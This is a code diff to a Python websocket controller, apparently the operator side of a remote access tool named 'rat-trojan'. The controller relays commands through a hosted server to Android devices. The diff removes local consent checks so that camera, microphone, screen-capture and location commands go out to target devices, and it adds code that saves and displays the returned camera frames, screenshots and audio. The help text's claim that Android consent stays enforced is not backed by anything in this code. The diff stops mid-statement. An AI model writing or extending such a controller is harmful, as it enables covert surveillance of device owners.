@@ -1,9 +1,14 @@
+
 import asyncio
 import json
+import os
 import platform
-import socket
+import sys
 import time
 import uuid
+from datetime import datetime
+from pathlib import Path
+from typing import Optional
 
 import websockets
 
@@ -12,17 +17,59 @@ import websockets
 # CONFIG
 # ============================================================
 
-RENDER_URL = (
-    "wss://rat-trojan.onrender.com/ws"
-)
+RENDER_URL = "wss://rat-trojan.onrender.com/ws"
 
 PC_DEVICE_ID = "pc-main"
 
-PAIRING_SECRET = "LAB-123456"
+PAIRING_SECRET = os.getenv(
+    "LAB_SECRET",
+    "LAB-123456",
+)
 
 HEARTBEAT_INTERVAL = 10
 
 RECONNECT_DELAY = 5
+
+
+# ============================================================
+# MEDIA DIRECTORIES
+# ============================================================
+
+BASE_DIR = Path(__file__).resolve().parent
+
+RECEIVED_DIR = BASE_DIR / "received_data"
+
+CAMERA_DIR = RECEIVED_DIR / "camera"
+
+SCREEN_DIR = RECEIVED_DIR / "screens"
+
+AUDIO_DIR = RECEIVED_DIR / "audio"
+
+CAMERA_DIR.mkdir(
+    parents=True,
+    exist_ok=True,
+)
+
+SCREEN_DIR.mkdir(
+    parents=True,
+    exist_ok=True,
+)
+
+AUDIO_DIR.mkdir(
+    parents=True,
+    exist_ok=True,
+)
+
+
+# ============================================================
+# CAMERA SETTINGS
+# ============================================================
+
+CAMERA_SAVE_INTERVAL = 5.0
+
+last_camera_save = 0.0
+
+camera_window_enabled = True
 
 
 # ============================================================
@@ -37,6 +84,46 @@ registered = False
 
 devices = {}
 
+pending_requests = {}
+
+pending_binary_metadata = None
+
+
+# ============================================================
+# LOCKS
+# ============================================================
+
+send_lock = asyncio.Lock()
+
+
+# ============================================================
+# UTILITY
+# ============================================================
+
+def now():
+    return time.time()
+
+
+def make_request_id():
+
+    return uuid.uuid4().hex[:12]
+
+
+def timestamp_string():
+
+    return datetime.now().strftime(
+        "%Y%m%d_%H%M%S_%f"
+    )
+
+
+def clear_screen():
+
+    os.system(
+        "cls"
+        if os.name == "nt"
+        else "clear"
+    )
+
 
 # ============================================================
 # PC INFO
@@ -45,15 +132,36 @@ devices = {}
 def get_pc_info():
 
     return {
-        "hostname": socket.gethostname(),
-        "platform": platform.system(),
-        "platform_release": platform.release(),
-        "platform_version": platform.version(),
-        "architecture": platform.machine(),
-        "processor": platform.processor(),
-        "python_version": platform.python_version(),
-        "agent_status": "active",
-        "timestamp": time.time(),
+        "device_id": PC_DEVICE_ID,
+
+        "device_type": "pc",
+
+        "hostname":
+            platform.node(),
+
+        "platform":
+            platform.system(),
+
+        "platform_release":
+            platform.release(),
+
+        "platform_version":
+            platform.version(),
+
+        "architecture":
+            platform.machine(),
+
+        "processor":
+            platform.processor(),
+
+        "python_version":
+            platform.python_version(),
+
+        "agent_status":
+            "active",
+
+        "timestamp":
+            now(),
     }
 
 
@@ -70,9 +178,11 @@ async def send_json(data):
 
     try:
 
-        await websocket.send(
-            json.dumps(data)
-        )
+        async with send_lock:
+
+            await websocket.send(
+                json.dumps(data)
+            )
 
         return True
 
@@ -86,21 +196,42 @@ async def send_json(data):
 
 
 # ============================================================
-# REGISTER
+# REGISTER PC
 # ============================================================
 
 async def register_pc():
 
-    print(
-        "[RENDER] Registering PC..."
+    data = {
+        "type": "pc_register",
+
+        "secret":
+            PAIRING_SECRET,
+
+        "device_id":
+            PC_DEVICE_ID,
+
+        "device_type":
+            "pc",
+
+        "info":
+            get_pc_info(),
+    }
+
+    return await send_json(
+        data
     )
+
+
+# ============================================================
+# REQUEST DEVICE LIST
+# ============================================================
+
+async def request_devices():
 
     return await send_json(
         {
-            "type": "pc_register",
-            "device_id": PC_DEVICE_ID,
-            "device_type": "pc",
-            "secret": PAIRING_SECRET,
+            "type":
+                "list_devices"
         }
     )
 
@@ -113,39 +244,125 @@ async def heartbeat_loop():
 
     while connected:
 
-        await asyncio.sleep(
-            HEARTBEAT_INTERVAL
-        )
+        try:
 
-        if not connected:
+            await asyncio.sleep(
+                HEARTBEAT_INTERVAL
+            )
+
+            if not connected:
+                break
+
+            await send_json(
+                {
+                    "type":
+                        "heartbeat",
+
+                    "device_id":
+                        PC_DEVICE_ID,
+
+                    "timestamp":
+                        now(),
+                }
+            )
+
+        except asyncio.CancelledError:
+
             break
 
-        await send_json(
-            {
-                "type": "heartbeat"
-            }
-        )
+        except Exception as exc:
+
+            print(
+                f"[HEARTBEAT ERROR] {exc}"
+            )
+
+            break
 
 
 # ============================================================
-# REQUEST DEVICES
+# COMMAND
 # ============================================================
 
-async def request_devices():
+async def send_command(
+    device_id,
+    command,
+    args=None,
+):
 
     if not connected:
 
         print(
-            "[RENDER] Not connected"
+            "[ERROR] PC is not connected."
         )
 
-        return
+        return None
 
-    await send_json(
-        {
-            "type": "list_devices"
-        }
+    if not device_id:
+
+        print(
+            "[ERROR] Missing device ID."
+        )
+
+        return None
+
+    if args is None:
+        args = {}
+
+    request_id = make_request_id()
+
+    message = {
+        "type":
+            "command",
+
+        "request_id":
+            request_id,
+
+        "device_id":
+            device_id,
+
+        "command":
+            command,
+
+        "args":
+            args,
+
+        "source_device_id":
+            PC_DEVICE_ID,
+    }
+
+    pending_requests[
+        request_id
+    ] = {
+        "device_id":
+            device_id,
+
+        "command":
+            command,
+
+        "created":
+            now(),
+    }
+
+    sent = await send_json(
+        message
     )
+
+    if not sent:
+
+        pending_requests.pop(
+            request_id,
+            None,
+        )
+
+        return None
+
+    print(
+        f"[COMMAND] "
+        f"{command} → "
+        f"{device_id}"
+    )
+
+    return request_id
 
 
 # ============================================================
@@ -161,121 +378,98 @@ def print_devices():
     )
 
     print(
-        f"{'DEVICE ID':<28}"
-        f"{'TYPE':<12}"
-        f"{'STATUS':<12}"
-    )
-
-    print(
-        "-" * 70
+        "=" * 80
     )
 
     if not devices:
 
         print(
-            "No devices registered."
+            "No devices received."
         )
+
+        print()
 
         return
 
     for device_id, device in devices.items():
 
-        device_type = str(
-            device.get(
-                "device_type",
-                "unknown",
-            )
+        status = device.get(
+            "status",
+            "unknown",
         )
 
-        status = str(
-            device.get(
-                "status",
-                "offline",
-            )
+        device_type = device.get(
+            "device_type",
+            "unknown",
+        )
+
+        info = device.get(
+            "info",
+            {},
         )
 
         print(
-            f"{device_id:<28}"
-            f"{device_type:<12}"
-            f"{status:<12}"
+            f"ID      : {device_id}"
+        )
+
+        print(
+            f"TYPE    : {device_type}"
+        )
+
+        print(
+            f"STATUS  : {status}"
+        )
+
+        if info:
+
+            manufacturer = info.get(
+                "manufacturer"
+            )
+
+            model = info.get(
+                "model"
+            )
+
+            android_version = info.get(
+                "android_version"
+            )
+
+            if manufacturer:
+                print(
+                    f"DEVICE  : "
+                    f"{manufacturer} "
+                    f"{model or ''}"
+                )
+
+            if android_version:
+                print(
+                    f"ANDROID : "
+                    f"{android_version}"
+                )
+
+        print(
+            "-" * 80
         )
 
     print()
 
 
 # ============================================================
-# SEND COMMAND
-# ============================================================
-
-async def send_command(
-    device_id,
-    command,
-    args=None,
-):
-
-    if args is None:
-        args = {}
-
-    if not connected:
-
-        print(
-            "[JARVIS] Not connected"
-        )
-
-        return
-
-    command_id = (
-        "cmd-"
-        + uuid.uuid4().hex[:8]
-    )
-
-    payload = {
-        "type": "command",
-        "device_id": device_id,
-        "command_id": command_id,
-        "command": command,
-        "args": args,
-    }
-
-    print()
-
-    print(
-        f"[COMMAND] {command}"
-    )
-
-    print(
-        f"[TARGET]  {device_id}"
-    )
-
-    print(
-        f"[ID]      {command_id}"
-    )
-
-    sent = await send_json(
-        payload
-    )
-
-    if not sent:
-
-        print(
-            "[COMMAND] Send failed"
-        )
-
-
-# ============================================================
-# HANDLE DEVICE LIST
+# DEVICE RESPONSE
 # ============================================================
 
 def handle_devices(data):
 
     global devices
 
-    devices = {}
-
-    for device in data.get(
+    device_list = data.get(
         "devices",
         [],
-    ):
+    )
+
+    devices = {}
+
+    for device in device_list:
 
         device_id = device.get(
             "device_id"
@@ -291,199 +485,353 @@ def handle_devices(data):
 
 
 # ============================================================
-# HANDLE COMMAND RESPONSE
+# COMMAND RESPONSE
 # ============================================================
 
 def handle_command_response(data):
 
-    print()
-
-    print(
-        "================================"
+    request_id = data.get(
+        "request_id"
     )
 
-    print(
-        " COMMAND RESPONSE"
+    success = data.get(
+        "success",
+        False,
     )
 
-    print(
-        "================================"
-    )
+    if success:
 
-    print(
-        json.dumps(
-            data,
-            indent=2,
-        )
-    )
-
-    print()
-
-
-# ============================================================
-# HANDLE COMMAND
-# ============================================================
-
-async def handle_command(data):
-
-    command = data.get(
-        "command"
-    )
-
-    command_id = data.get(
-        "command_id"
-    )
-
-    source_device_id = data.get(
-        "source_device_id"
-    )
-
-    print()
-
-    print(
-        "[COMMAND RECEIVED]"
-    )
-
-    print(
-        f"Command : {command}"
-    )
-
-    print(
-        f"ID      : {command_id}"
-    )
-
-    # --------------------------------------------------------
-    # DEVICE INFO
-    # --------------------------------------------------------
-
-    if command == "device_info":
-
-        response = {
-            "type": "command_response",
-            "success": True,
-            "command_id": command_id,
-            "source_device_id": source_device_id,
-            "result": get_pc_info(),
-        }
-
-        await send_json(
-            response
+        response_data = data.get(
+            "data",
+            {},
         )
 
-        return
+        print()
 
-    # --------------------------------------------------------
-    # CONNECTION STATUS
-    # --------------------------------------------------------
-
-    if command == "connection_status":
-
-        response = {
-            "type": "command_response",
-            "success": True,
-            "command_id": command_id,
-            "source_device_id": source_device_id,
-            "result": {
-                "connected": connected,
-                "registered": registered,
-                "timestamp": time.time(),
-            },
-        }
-
-        await send_json(
-            response
+        print(
+            "[COMMAND OK]"
         )
 
-        return
+        if response_data:
 
-    # --------------------------------------------------------
-    # PING
-    # --------------------------------------------------------
+            print(
+                json.dumps(
+                    response_data,
+                    indent=2,
+                )
+            )
 
-    if command == "ping":
+        else:
 
-        response = {
-            "type": "command_response",
-            "success": True,
-            "command_id": command_id,
-            "source_device_id": source_device_id,
-            "result": {
-                "message": "pong",
-                "timestamp": time.time(),
-            },
-        }
+            print(
+                "Command completed."
+            )
 
-        await send_json(
-            response
-        )
+    else:
 
-        return
-
-    # --------------------------------------------------------
-    # SENSITIVE COMMANDS
-    # --------------------------------------------------------
-
-    sensitive_commands = {
-        "start_camera",
-        "stop_camera",
-        "camera_front",
-        "camera_back",
-        "camera_switch",
-        "start_microphone",
-        "stop_microphone",
-        "start_screen",
-        "stop_screen",
-    }
-
-    if command in sensitive_commands:
-
-        response = {
-            "type": "command_response",
-            "success": False,
-            "command_id": command_id,
-            "source_device_id": source_device_id,
-            "message": (
-                "Media capture must be "
-                "started through explicit "
-                "local user consent."
+        error = data.get(
+            "error",
+            data.get(
+                "message",
+                "unknown_error",
             ),
-        }
+        )
 
-        await send_json(
-            response
+        print()
+
+        print(
+            f"[COMMAND FAILED] "
+            f"{error}"
+        )
+
+    if request_id:
+
+        pending_requests.pop(
+            request_id,
+            None,
+        )
+
+
+# ============================================================
+# SAVE CAMERA FRAME
+# ============================================================
+
+def save_camera_frame(
+    payload: bytes,
+):
+
+    global last_camera_save
+
+    current = now()
+
+    if (
+        current -
+        last_camera_save
+        < CAMERA_SAVE_INTERVAL
+    ):
+
+        return
+
+    filename = (
+        f"camera_"
+        f"{timestamp_string()}.jpg"
+    )
+
+    path = CAMERA_DIR / filename
+
+    try:
+
+        path.write_bytes(
+            payload
+        )
+
+        last_camera_save = current
+
+        print(
+            f"[CAMERA] snapshot saved: "
+            f"{path}"
+        )
+
+    except Exception as exc:
+
+        print(
+            f"[CAMERA SAVE ERROR] "
+            f"{exc}"
+        )
+
+
+# ============================================================
+# DISPLAY CAMERA
+# ============================================================
+
+def display_camera_frame(
+    payload: bytes,
+):
+
+    if not camera_window_enabled:
+        return
+
+    try:
+
+        import cv2
+        import numpy as np
+
+    except ImportError:
+
+        return
+
+    try:
+
+        array = np.frombuffer(
+            payload,
+            dtype=np.uint8,
+        )
+
+        frame = cv2.imdecode(
+            array,
+            cv2.IMREAD_COLOR,
+        )
+
+        if frame is None:
+            return
+
+        cv2.imshow(
+            "JARVIS Remote Camera",
+            frame,
+        )
+
+        cv2.waitKey(1)
+
+    except Exception as exc:
+
+        print(
+            f"[CAMERA DISPLAY ERROR] "
+            f"{exc}"
+        )
+
+
+# ============================================================
+# SAVE SCREEN FRAME
+# ============================================================
+
+def save_screen_frame(
+    payload: bytes,
+):
+
+    filename = (
+        f"screen_"
+        f"{timestamp_string()}.jpg"
+    )
+
+    path = SCREEN_DIR / filename
+
+    try:
+
+        path.write_bytes(
+            payload
+        )
+
+        print(
+            f"[SCREEN] saved: "
+            f"{path}"
+        )
+
+    except Exception as exc:
+
+        print(
+            f"[SCREEN SAVE ERROR] "
+            f"{exc}"
+        )
+
+
+# ============================================================
+# SAVE AUDIO
+# ============================================================
+
+def save_audio_chunk(
+    payload: bytes,
+):
+
+    filename = (
+        f"audio_"
+        f"{timestamp_string()}.bin"
+    )
+
+    path = AUDIO_DIR / filename
+
+    try:
+
+        path.write_bytes(
+            payload
+        )
+
+        print(
+            f"[AUDIO] chunk saved: "
+            f"{path}"
+        )
+
+    except Exception as exc:
+
+        print(
+            f"[AUDIO SAVE ERROR] "
+            f"{exc}"
+        )
+
+
+# ============================================================
+# MEDIA BINARY
+# ============================================================
+
+def handle_binary(
+    payload: bytes,
+):
+
+    global pending_binary_metadata
+
+    metadata = pending_binary_metadata
+
+    pending_binary_metadata = None
+
+    if metadata is None:
+
+        print(
+            "[MEDIA] binary received "
+            "without metadata"
+        )
+
+        return
+
+    media_type = metadata.get(
+        "type",
+        "unknown",
+    )
+
+    source_device = metadata.get(
+        "source_device_id",
+        "unknown",
+    )
+
+    print(
+        f"[MEDIA] "
+        f"{media_type} "
+        f"from {source_device} "
+        f"({len(payload)} bytes)"
+    )
+
+    # --------------------------------------------------------
+    # CAMERA
+    # --------------------------------------------------------
+
+    if media_type == "camera_frame":
+
+        display_camera_frame(
+            payload
+        )
+
+        save_camera_frame(
+            payload
         )
 
         return
 
     # --------------------------------------------------------
-    # UNKNOWN
+    # SCREEN
     # --------------------------------------------------------
 
-    response = {
-        "type": "command_response",
-        "success": False,
-        "command_id": command_id,
-        "source_device_id": source_device_id,
-        "message": (
-            f"Unsupported command: "
-            f"{command}"
-        ),
-    }
+    if media_type == "screen_frame":
 
-    await send_json(
-        response
+        save_screen_frame(
+            payload
+        )
+
+        return
+
+    # --------------------------------------------------------
+    # MICROPHONE
+    # --------------------------------------------------------
+
+    if media_type == "microphone_chunk":
+
+        save_audio_chunk(
+            payload
+        )
+
+        return
+
+    print(
+        f"[MEDIA] unknown type: "
+        f"{media_type}"
     )
 
 
 # ============================================================
-# HANDLE TEXT
+# MESSAGE HANDLER
 # ============================================================
 
-async def handle_text_message(
+async def handle_message(
     message,
 ):
 
-    global registered
+    global pending_binary_metadata
+
+    # ========================================================
+    # BINARY
+    # ========================================================
+
+    if isinstance(
+        message,
+        bytes,
+    ):
+
+        handle_binary(
+            message
+        )
+
+        return
+
+    # ========================================================
+    # JSON
+    # ========================================================
 
     try:
 
@@ -494,7 +842,8 @@ async def handle_text_message(
     except json.JSONDecodeError:
 
         print(
-            "[RENDER] Invalid JSON"
+            "[ERROR] Invalid JSON "
+            "received."
         )
 
         return
@@ -509,85 +858,45 @@ async def handle_text_message(
 
     if message_type == "pc_register_response":
 
-        if data.get(
-            "success"
-        ):
+        success = data.get(
+            "success",
+            False,
+        )
+
+        if success:
+
+            global registered
 
             registered = True
 
             print(
-                "[RENDER] "
-                "PC registered successfully"
+                "[PC] Registered successfully."
             )
 
-            # Publish PC information.
-            await send_json(
-                {
-                    "type": "device_info",
-                    "info": get_pc_info(),
-                }
-            )
-
-            # Get current registry.
             await request_devices()
 
         else:
 
-            registered = False
-
             print(
-                "[RENDER] "
-                "PC registration failed"
+                "[PC] Registration failed:"
             )
 
             print(
                 data.get(
                     "message",
-                    "Unknown error",
+                    "unknown",
                 )
             )
 
         return
 
     # ========================================================
-    # DEVICE LIST
+    # DEVICES
     # ========================================================
 
     if message_type == "devices":
 
         handle_devices(
-            data
-        )
-
-        return
-
-    # ========================================================
-    # HEARTBEAT
-    # ========================================================
-
-    if message_type == "heartbeat_response":
-
-        return
-
-    # ========================================================
-    # PONG
-    # ========================================================
-
-    if message_type == "pong":
-
-        print(
-            "[RENDER] PONG"
-        )
-
-        return
-
-    # ========================================================
-    # COMMAND
-    # ========================================================
-
-    if message_type == "command":
-
-        await handle_command(
             data
         )
 
@@ -627,6 +936,36 @@ async def handle_text_message(
         return
 
     # ========================================================
+    # MEDIA METADATA
+    # ========================================================
+
+    if message_type in {
+        "camera_frame",
+        "screen_frame",
+        "microphone_chunk",
+    }:
+
+        pending_binary_metadata = data
+
+        return
+
+    # ========================================================
+    # HEARTBEAT
+    # ========================================================
+
+    if message_type == "heartbeat_response":
+
+        return
+
+    # ========================================================
+    # PONG
+    # ========================================================
+
+    if message_type == "pong":
+
+        return
+
+    # ========================================================
     # ERROR
     # ========================================================
 
@@ -641,7 +980,7 @@ async def handle_text_message(
         print(
             data.get(
                 "message",
-                "Unknown error",
+                data,
             )
         )
 
@@ -651,111 +990,93 @@ async def handle_text_message(
     # UNKNOWN
     # ========================================================
 
+    print()
+
     print(
-        "[RENDER] Unknown message:",
-        data,
+        "[SERVER]"
+    )
+
+    print(
+        json.dumps(
+            data,
+            indent=2,
+        )
     )
 
 
 # ============================================================
-# RECEIVE LOOP
+# RECEIVER LOOP
 # ============================================================
 
-async def receive_loop():
+async def receiver_loop():
 
     global connected
     global registered
 
-    try:
+    while connected:
 
-        async for message in websocket:
+        try:
 
-            if isinstance(
-                message,
-                bytes,
-            ):
+            message = await websocket.recv()
 
-                print(
-                    "[RENDER] "
-                    "Unexpected binary message"
-                )
-
-                continue
-
-            await handle_text_message(
+            await handle_message(
                 message
             )
 
-    except websockets.ConnectionClosed as exc:
+        except asyncio.CancelledError:
 
-        print()
+            break
 
-        print(
-            "[RENDER] "
-            "Connection closed"
-        )
+        except Exception as exc:
 
-        print(
-            f"Code   : {exc.code}"
-        )
+            print(
+                f"[RECEIVER ERROR] "
+                f"{exc}"
+            )
 
-        print(
-            f"Reason : {exc.reason}"
-        )
-
-    except Exception as exc:
-
-        print()
-
-        print(
-            "[RENDER] "
-            "Receive error:",
-            exc,
-        )
-
-    finally:
-
-        connected = False
-        registered = False
+            break
 
 
 # ============================================================
 # CONNECT
 # ============================================================
 
-async def connect_to_render():
+async def connect():
 
     global websocket
     global connected
     global registered
 
-    print()
-
-    print(
-        "[RENDER] Connecting..."
-    )
-
     try:
+
+        print(
+            f"[CONNECT] "
+            f"{RENDER_URL}"
+        )
 
         websocket = await websockets.connect(
             RENDER_URL,
+
             ping_interval=20,
+
             ping_timeout=20,
+
             close_timeout=5,
-            max_size=16 * 1024 * 1024,
+
+            max_size=None,
         )
 
         connected = True
         registered = False
 
         print(
-            "[RENDER] Connected"
+            "[CONNECTED]"
         )
 
         await register_pc()
 
-        receive_task = asyncio.create_task(
-            receive_loop()
+        receiver_task = asyncio.create_task(
+            receiver_loop()
         )
 
         heartbeat_task = asyncio.create_task(
@@ -763,10 +1084,10 @@ async def connect_to_render():
         )
 
         done, pending = await asyncio.wait(
-            [
-                receive_task,
+            {
+                receiver_task,
                 heartbeat_task,
-            ],
+            },
             return_when=asyncio.FIRST_COMPLETED,
         )
 
@@ -780,18 +1101,14 @@ async def connect_to_render():
 
                 await task
 
-            except asyncio.CancelledError:
-
+            except Exception:
                 pass
 
     except Exception as exc:
 
-        print()
-
         print(
-            "[RENDER] "
-            "Connection failed:",
-            exc,
+            f"[CONNECTION ERROR] "
+            f"{exc}"
         )
 
     finally:
@@ -799,504 +1116,31 @@ async def connect_to_render():
         connected = False
         registered = False
 
-        try:
-
-            if websocket is not None:
-
-                await websocket.close()
-
-        except Exception:
-            pass
-
         websocket = None
 
         print(
-            "[RENDER] Disconnected"
+            "[DISCONNECTED]"
         )
 
 
 # ============================================================
-# PARSE COMMAND
+# CONNECTION MANAGER
 # ============================================================
 
-async def process_cli_command(
-    command_line,
-):
+async def connection_loop():
 
-    parts = command_line.split()
+    while True:
 
-    if not parts:
-        return True
-
-    command = parts[0].lower()
-
-    # ========================================================
-    # DEVICES
-    # ========================================================
-
-    if command == "devices":
-
-        await request_devices()
-
-        return True
-
-    # ========================================================
-    # REFRESH
-    # ========================================================
-
-    if command == "refresh":
-
-        await request_devices()
-
-        return True
-
-    # ========================================================
-    # INFO <device_id>
-    # ========================================================
-
-    if command == "info":
-
-        if len(parts) != 2:
-
-            print(
-                "Usage:"
-            )
-
-            print(
-                "  info <device_id>"
-            )
-
-            return True
-
-        device_id = parts[1]
-
-        await send_command(
-            device_id,
-            "device_info",
-        )
-
-        return True
-
-    # ========================================================
-    # BATTERY <device_id>
-    # ========================================================
-
-    if command == "battery":
-
-        if len(parts) != 2:
-
-            print(
-                "Usage:"
-            )
-
-            print(
-                "  battery <device_id>"
-            )
-
-            return True
-
-        device_id = parts[1]
-
-        await send_command(
-            device_id,
-            "battery_status",
-        )
-
-        return True
-
-    # ========================================================
-    # STATUS <device_id>
-    # ========================================================
-
-    if command == "status":
-
-        if len(parts) != 2:
-
-            print(
-                "Usage:"
-            )
-
-            print(
-                "  status <device_id>"
-            )
-
-            return True
-
-        device_id = parts[1]
-
-        await send_command(
-            device_id,
-            "connection_status",
-        )
-
-        return True
-
-    # ========================================================
-    # LOCATION <device_id>
-    # ========================================================
-
-    if command == "location":
-
-        if len(parts) != 2:
-
-            print(
-                "Usage:"
-            )
-
-            print(
-                "  location <device_id>"
-            )
-
-            return True
-
-        device_id = parts[1]
-
-        await send_command(
-            device_id,
-            "location_request",
-        )
-
-        return True
-
-    # ========================================================
-    # SCREEN-START
-    # ========================================================
-
-    if command == "screen-start":
-
-        if len(parts) != 2:
-
-            print(
-                "Usage:"
-            )
-
-            print(
-                "  screen-start <device_id>"
-            )
-
-            return True
+        await connect()
 
         print(
-            "[INFO] Screen capture must "
-            "be started through the "
-            "Android app's local consent UI."
+            f"[RECONNECT] "
+            f"in {RECONNECT_DELAY} seconds..."
         )
 
-        return True
-
-    # ========================================================
-    # SCREEN-STOP
-    # ========================================================
-
-    if command == "screen-stop":
-
-        if len(parts) != 2:
-
-            print(
-                "Usage:"
-            )
-
-            print(
-                "  screen-stop <device_id>"
-            )
-
-            return True
-
-        print(
-            "[INFO] Screen capture is "
-            "controlled by the Android "
-            "app's local consent flow."
+        await asyncio.sleep(
+            RECONNECT_DELAY
         )
-
-        return True
-
-    # ========================================================
-    # MICROPHONE-START
-    # ========================================================
-
-    if command == "microphone-start":
-
-        if len(parts) != 2:
-
-            print(
-                "Usage:"
-            )
-
-            print(
-                "  microphone-start <device_id>"
-            )
-
-            return True
-
-        print(
-            "[INFO] Microphone capture "
-            "requires explicit local "
-            "Android consent."
-        )
-
-        return True
-
-    # ========================================================
-    # MICROPHONE-STOP
-    # ========================================================
-
-    if command == "microphone-stop":
-
-        if len(parts) != 2:
-
-            print(
-                "Usage:"
-            )
-
-            print(
-                "  microphone-stop <device_id>"
-            )
-
-            return True
-
-        print(
-            "[INFO] Microphone capture "
-            "is controlled locally."
-        )
-
-        return True
-
-    # ========================================================
-    # CAMERA-START
-    # ========================================================
-
-    if command == "camera-start":
-
-        if len(parts) != 2:
-
-            print(
-                "Usage:"
-            )
-
-            print(
-                "  camera-start <device_id>"
-            )
-
-            return True
-
-        print(
-            "[INFO] Camera capture "
-            "requires explicit local "
-            "Android consent."
-        )
-
-        return True
-
-    # ========================================================
-    # CAMERA-STOP
-    # ========================================================
-
-    if command == "camera-stop":
-
-        if len(parts) != 2:
-
-            print(
-                "Usage:"
-            )
-
-            print(
-                "  camera-stop <device_id>"
-            )
-
-            return True
-
-        print(
-            "[INFO] Camera capture "
-            "is controlled locally."
-        )
-
-        return True
-
-    # ========================================================
-    # CAMERA FRONT
-    # ========================================================
-
-    if command == "camera-front":
-
-        if len(parts) != 2:
-
-            print(
-                "Usage:"
-            )
-
-            print(
-                "  camera-front <device_id>"
-            )
-
-            return True
-
-        print(
-            "[INFO] Camera selection "
-            "requires the Android app's "
-            "authorized camera session."
-        )
-
-        return True
-
-    # ========================================================
-    # CAMERA BACK
-    # ========================================================
-
-    if command == "camera-back":
-
-        if len(parts) != 2:
-
-            print(
-                "Usage:"
-            )
-
-            print(
-                "  camera-back <device_id>"
-            )
-
-            return True
-
-        print(
-            "[INFO] Camera selection "
-            "requires the Android app's "
-            "authorized camera session."
-        )
-
-        return True
-
-    # ========================================================
-    # CAMERA SWITCH
-    # ========================================================
-
-    if command == "camera-switch":
-
-        if len(parts) != 2:
-
-            print(
-                "Usage:"
-            )
-
-            print(
-                "  camera-switch <device_id>"
-            )
-
-            return True
-
-        print(
-            "[INFO] Camera switching "
-            "requires the Android app's "
-            "authorized camera session."
-        )
-
-        return True
-
-    # ========================================================
-    # CAMERA INTERVAL
-    # ========================================================
-
-    if command == "camera-interval":
-
-        if len(parts) != 3:
-
-            print(
-                "Usage:"
-            )
-
-            print(
-                "  camera-interval "
-                "<device_id> <seconds>"
-            )
-
-            return True
-
-        device_id = parts[1]
-
-        try:
-
-            seconds = float(
-                parts[2]
-            )
-
-            if seconds <= 0:
-
-                raise ValueError
-
-        except ValueError:
-
-            print(
-                "Interval must be "
-                "greater than 0."
-            )
-
-            return True
-
-        # The interval is deliberately
-        # a PC-side setting, not an
-        # Android capture instruction.
-        print(
-            f"[INFO] Snapshot interval "
-            f"for {device_id} would be "
-            f"set to {seconds:g}s in the "
-            f"PC-side authorized camera "
-            f"viewer."
-        )
-
-        return True
-
-    # ========================================================
-    # CLEAR
-    # ========================================================
-
-    if command == "clear":
-
-        import os
-
-        os.system(
-            "cls"
-            if os.name == "nt"
-            else "clear"
-        )
-
-        return True
-
-    # ========================================================
-    # EXIT
-    # ========================================================
-
-    if command in {
-        "exit",
-        "quit",
-    }:
-
-        return False
-
-    # ========================================================
-    # HELP
-    # ========================================================
-
-    if command in {
-        "help",
-        "?",
-    }:
-
-        print_help()
-
-        return True
-
-    # ========================================================
-    # UNKNOWN
-    # ========================================================
-
-    print(
-        f"Unknown command: "
-        f"{command}"
-    )
-
-    print(
-        "Type 'help' for commands."
-    )
-
-    return True
 
 
 # ============================================================
@@ -1405,18 +1249,20 @@ def print_help():
     print()
 
     print(
-        "Media commands require "
-        "explicit local Android consent."
+        "Camera/microphone/screen commands "
+        "are forwarded to Android, where "
+        "Android permissions and consent "
+        "remain enforced."
     )
 
     print()
 
 
 # ============================================================
-# CLI LOOP
+# COMMAND LINE
 # ============================================================
 
-async def command_loop():
+async def cli_loop():
 
     print()
 
@@ -1425,12 +1271,22 @@ async def command_loop():
     )
 
     print(
-        "      JARVIS CLOUD CONTROLLER"
+        "        JARVIS PC AGENT"
     )
 
     print(
         "================================"
     )
+
+    print(
+        f"PC ID: {PC_DEVICE_ID}"
+    )
+
+    print(
+        f"Server: {RENDER_URL}"
+    )
+
+    print()
 
     print_help()
 
@@ -1443,24 +1299,230 @@ async def command_loop():
                 "JARVIS> ",
             )
 
-        except (
-            EOFError,
-            KeyboardInterrupt,
-        ):
+        except EOFError:
 
-            return
+            break
+
+        except KeyboardInterrupt:
+
+            print()
+
+            break
 
         command_line = command_line.strip()
 
         if not command_line:
             continue
 
-        keep_running = await process_cli_command(
-            command_line
+        parts = command_line.split()
+
+        command = parts[0].lower()
+
+        # ====================================================
+        # EXIT
+        # ====================================================
+
+        if command == "exit":
+
+            print(
+                "Exiting..."
+            )
+
+            break
+
+        # ====================================================
+        # HELP
+        # ====================================================
+
+        if command == "help":
+
+            print_help()
+
+            continue
+
+        # ====================================================
+        # CLEAR
+        # ====================================================
+
+        if command == "clear":
+
+            clear_screen()
+
+            continue
+
+        # ====================================================
+        # DEVICES
+        # ====================================================
+
+        if command == "devices":
+
+            print_devices()
+
+            continue
+
+        # ====================================================
+        # REFRESH
+        # ====================================================
+
+        if command == "refresh":
+
+            if not connected:
+
+                print(
+                    "[ERROR] Not connected."
+                )
+
+                continue
+
+            await request_devices()
+
+            continue
+
+        # ====================================================
+        # COMMANDS REQUIRING DEVICE ID
+        # ====================================================
+
+        commands_without_args = {
+            "info":
+                "device_info",
+
+            "battery":
+                "battery_status",
+
+            "status":
+                "connection_status",
+
+            "location":
+                "location_request",
+
+            "screen-start":
+                "start_screen",
+
+            "screen-stop":
+                "stop_screen",
+
+            "microphone-start":
+                "start_microphone",
+
+            "microphone-stop":
+                "stop_microphone",
+
+            "camera-start":
+                "start_camera",
+
+            "camera-stop":
+                "stop_camera",
+
+            "camera-front":
+                "camera_front",
+
+            "camera-back":
+                "camera_back",
+
+            "camera-switch":
+                "camera_switch",
+        }
+
+        if command in commands_without_args:
+
+            if len(parts) != 2:
+
+                print(
+                    f"[USAGE] "
+                    f"{command} <device_id>"
+                )
+
+                continue
+
+            device_id = parts[1]
+
+            server_command = (
+                commands_without_args[
+                    command
+                ]
+            )
+
+            await send_command(
+                device_id=
+                    device_id,
+
+                command=
+                    server_command,
+            )
+
+            continue
+
+        # ====================================================
+        # CAMERA INTERVAL
+        # ====================================================
+
+        if command == "camera-interval":
+
+            if len(parts) != 3:
+
+                print(
+                    "[USAGE] "
+                    "camera-interval "
+                    "<device_id> <seconds>"
+                )
+
+                continue
+
+            device_id = parts[1]
+
+            try:
+
+                seconds = float(
+                    parts[2]
+                )
+
+            except ValueError:
+
+                print(
+                    "[ERROR] "
+                    "Seconds must be a number."
+                )
+
+                continue
+
+            if seconds <= 0:
+
+                print(
+                    "[ERROR] "
+                    "Seconds must be greater than 0."
+                )
+
+                continue
+
+            global CAMERA_SAVE_INTERVAL
+
+            CAMERA_SAVE_INTERVAL = seconds
+
+            print(
+                f"[CAMERA] PC snapshot "
+                f"interval = "
